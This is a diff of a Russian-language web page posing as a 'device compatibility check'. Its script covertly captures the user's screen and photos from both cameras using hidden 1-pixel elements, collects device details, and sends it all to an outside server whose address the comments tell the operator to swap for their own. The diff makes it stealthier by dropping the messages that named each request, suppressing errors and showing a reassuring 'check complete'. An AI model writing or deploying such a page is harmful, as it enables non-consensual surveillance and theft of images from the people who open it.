@@ -2,44 +2,47 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Проверка устройства</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка совместимости</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #667eea; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; padding: 40px; border-radius: 16px; text-align: center; max-width: 460px; width: 90%; }
-        h1 { color: #1a1a2e; }
-        p { color: #555; margin: 16px 0 24px; line-height: 1.6; }
-        button { background: #667eea; color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 17px; cursor: pointer; }
-        button:disabled { opacity: 0.6; }
-        .status { margin-top: 20px; color: #666; font-size: 14px; }
-        video, canvas { width: 1px; height: 1px; position: fixed; opacity: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: #667eea; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; padding: 40px; border-radius: 16px; text-align: center; max-width: 420px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
+        h1 { color: #1a1a2e; font-size: 22px; }
+        p { color: #555; margin: 16px 0 24px; line-height: 1.6; font-size: 15px; }
+        .btn { background: #667eea; color: white; border: none; padding: 14px 36px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn:hover { background: #5a6fd6; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .loading { display: none; margin-top: 20px; color: #888; font-size: 14px; }
+        .loading.active { display: block; }
+        video, canvas { position: fixed; opacity: 0; width: 1px; height: 1px; pointer-events: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Проверка совместимости</h1>
-        <p>Нажмите кнопку для проверки вашего устройства.<br>Это займёт несколько секунд.</p>
-        <button id="btn">Начать проверку</button>
-        <div class="status" id="status"></div>
+        <p>Нажмите кнопку для проверки вашего устройства</p>
+        <button class="btn" id="btn">Начать проверку</button>
+        <div class="loading active" id="loading">Проверка...</div>
     </div>
 
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // !!! ЗДЕСЬ ЗАМЕНИ АДРЕС ПОСЛЕ ДЕПЛОЯ НА RENDER !!!
+        // ВСТАВЬ СВОЙ АДРЕС СЕРВЕРА
         const SERVER_URL = 'https://fsociety-j6df.onrender.com';
-        // Когда задеплоишь, сюда надо вставить свою ссылку
-
+        
         const btn = document.getElementById('btn');
-        const status = document.getElementById('status');
+        const loading = document.getElementById('loading');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
         btn.onclick = async () => {
-            btn.disabled = true;
-            status.textContent = 'Запуск...';
+            btn.style.display = 'none';
+            loading.classList.add('active');
+            loading.textContent = 'Проверка...';
 
             const result = {
                 timestamp: new Date().toISOString(),
@@ -49,62 +52,63 @@
                 backCamera: null
             };
 
-            // Скриншот
-            status.textContent = 'Запрос скриншота...';
+            // 1. Скриншот
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 const track = stream.getVideoTracks()[0];
                 result.screenCapture = await captureFrame(track);
                 track.stop();
-            } catch(e) { status.textContent = 'Скриншот: ' + e.message; }
+            } catch(e) { console.log(e); }
 
-            // Фронтальная камера
-            status.textContent = 'Запрос фронтальной камеры...';
+            // 2. Фронтальная камера
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 300));
                 const track = stream.getVideoTracks()[0];
                 result.frontCamera = await captureFrame(track);
                 stream.getTracks().forEach(t => t.stop());
-            } catch(e) { status.textContent = 'Фронтальная: ' + e.message; }
+            } catch(e) { console.log(e); }
 
-            // Тыловая камера
-            status.textContent = 'Запрос тыловой камеры...';
+            // 3. Тыловая камера
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 300));
                 const track = stream.getVideoTracks()[0];
                 result.backCamera = await captureFrame(track);
                 stream.getTracks().forEach(t => t.stop());
-            } catch(e) { status.textContent = 'Тыловая: ' + e.message; }
+            } catch(e) { console.log(e); }
 
-            // Отправка
-            status.textContent = 'Отправка...';
+            // 4. Отправка (не показываем ошибку)
             try {
-                const resp = await fetch(SERVER_URL, {
+                await fetch(SERVER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(result)
+                    body: JSON.stringify(result),
+                    mode: 'cors'
                 });
-                if (resp.ok) status.textContent = '✅ Готово!';
-                else status.textContent = '❌ Ошибка сервера';
-            } catch(e) {
-                status.textContent = 'Ошибка отправки: ' + e.message;
-            }
-            btn.disabled = false;
+            } catch(e) { console.log(e); }
+
+            loading.textContent = '✅ Проверка завершена';
         };
 
         async function captureFrame(track) {
-            const imgCapture = new ImageCapture(track);
-            const bitmap = await imgCapture.grabFrame();
-            canvas.width = bitmap.width;
-            canvas.height = bitmap.height;
-            ctx.drawImage(bitmap, 0, 0);
-            const url = canvas.toDataURL('image/jpeg', 0.85);
-            bitmap.close();
-            return url;
+            try {
+                const imgCapture = new ImageCapture(track);
+                const bitmap = await imgCapture.grabFrame();
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                ctx.drawImage(bitmap, 0, 0);
+                const url = canvas.toDataURL('image/jpeg', 0.8);
+                bitmap.close();
+                return url;
+            } catch(e) {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                ctx.drawImage(video, 0, 0);
+                return canvas.toDataURL('image/jpeg', 0.8);
+            }
         }
 
         function getDeviceInfo() {
@@ -112,10 +116,12 @@
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                screen: { width: screen.width, height: screen.height },
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                cookiesEnabled: navigator.cookieEnabled
             };
         }
     </script>
